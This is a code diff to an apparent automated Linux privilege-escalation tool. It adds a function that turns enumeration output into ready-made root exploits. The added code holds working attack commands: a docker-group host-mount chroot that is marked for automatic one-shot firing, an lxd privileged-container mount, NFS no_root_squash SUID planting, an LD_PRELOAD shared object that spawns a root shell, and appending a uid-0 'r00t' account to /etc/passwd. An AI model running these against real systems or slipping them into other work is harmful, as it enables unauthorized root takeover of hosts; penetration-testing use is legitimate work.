@@ -284,6 +284,53 @@ def _dedupe(vectors: list[PrivescVector]) -> list[PrivescVector]:
 
 _CONF_ORDER = {"high": 0, "med": 1, "low": 2}
 
+# 그룹 멤버십(id 출력) / 서비스 설정 기반 비-GTFOBins 표준 벡터 탐지용.
+_DOCKER_GRP_RE = re.compile(r"\b(?:gid=\d+\(docker\)|groups=[^\n]*\(docker\)|\(docker\))", re.I)
+_LXD_GRP_RE = re.compile(r"\((lxd|lxc)\)", re.I)
+_NFS_NRS_RE = re.compile(r"no_root_squash", re.I)
+_SUDO_LDPRELOAD_RE = re.compile(r"env_keep\+?=.*LD_PRELOAD|LD_PRELOAD[^\n]*env_keep", re.I)
+# writable /etc/passwd: find -writable 출력에 단독 경로로 등장하거나, ls -l 에서 group/other write.
+_PASSWD_WRITABLE_RE = re.compile(
+    r"(?m)^\s*/etc/passwd\s*$|^-[rwx-]{3}[-r][w][-x].*\s/etc/passwd|"
+    r"^-[rwx-]{6}[-r][w].*\s/etc/passwd")
+
+
+def analyze_extra(enum_text: str) -> list[PrivescVector]:
+    """GTFOBins 외 '표준·스크립트형' 권한상승 벡터 탐지(그룹 멤버십·서비스 설정 기반).
+    실행 없음 — 파싱·제안 생성만. docker 그룹만 신뢰도 높은 one-shot(자동 발사 가능)으로 주고,
+    나머지(lxd·NFS·LD_PRELOAD·writable passwd)는 '정확한 실행 단계 제안'(med — 자동 발사 안 함,
+    사람이 검토 실행)으로 surface 한다. 안전: 파괴적/환경의존 벡터는 자동 발사하지 않는다."""
+    text = enum_text or ""
+    out: list[PrivescVector] = []
+    if _DOCKER_GRP_RE.search(text):
+        out.append(PrivescVector(
+            "docker-group", "docker", "docker 그룹 → 호스트 / 마운트 chroot 로 root",
+            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "high", "GTFOBins/groups",
+            oneshot_tmpl="docker run -v /:/mnt --rm alpine chroot /mnt sh -c '{payload}'"))
+    if _LXD_GRP_RE.search(text):
+        out.append(PrivescVector(
+            "lxd-group", "lxd", "lxd/lxc 그룹 → 특권 컨테이너로 호스트 / 마운트",
+            "lxc init alpine r -c security.privileged=true; "
+            "lxc config device add r d disk source=/ path=/mnt; lxc start r; "
+            "lxc exec r -- chroot /mnt sh   # (alpine 이미지 import 선행)", "med", "GTFOBins/groups"))
+    if _NFS_NRS_RE.search(text):
+        out.append(PrivescVector(
+            "nfs", "no_root_squash", "NFS no_root_squash → 공격자 측에서 SUID 바이너리 심기",
+            "# 공격자: mount -t nfs <t>:/share /mnt; cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash\n"
+            "# 타겟: /share/rootbash -p", "med", "HackTricks"))
+    if _SUDO_LDPRELOAD_RE.search(text):
+        out.append(PrivescVector(
+            "ld-preload", "LD_PRELOAD", "sudo env_keep+=LD_PRELOAD → 임의 .so 로 root",
+            "# gcc -fPIC -shared -o /tmp/x.so x.c (x.c: _init(){setuid(0);system(\"/bin/bash\");})\n"
+            "sudo LD_PRELOAD=/tmp/x.so <허용된_명령>", "med", "GTFOBins"))
+    if _PASSWD_WRITABLE_RE.search(text):
+        out.append(PrivescVector(
+            "writable-passwd", "/etc/passwd", "/etc/passwd 쓰기가능 → root 계정 추가",
+            "openssl passwd -1 -salt x pass123   # 해시 생성 후 아래에 대입\n"
+            "echo 'r00t:<위_해시>:0:0::/root:/bin/bash' >> /etc/passwd; su r00t   # 비번 pass123",
+            "med", "HackTricks"))
+    return out
+
 
 def analyze_enum(enum_text: str) -> list[PrivescVector]:
     """privesc 열거 출력(여러 명령이 섞인 코퍼스)에서 모든 벡터를 뽑아 확신도순 랭킹.
@@ -292,6 +339,7 @@ def analyze_enum(enum_text: str) -> list[PrivescVector]:
     vectors += analyze_sudo(enum_text)
     vectors += analyze_suid(enum_text)
     vectors += analyze_capabilities(enum_text)
+    vectors += analyze_extra(enum_text)
     vectors = _dedupe(vectors)
     vectors.sort(key=lambda v: _CONF_ORDER.get(v.confidence, 9))
     return vectors
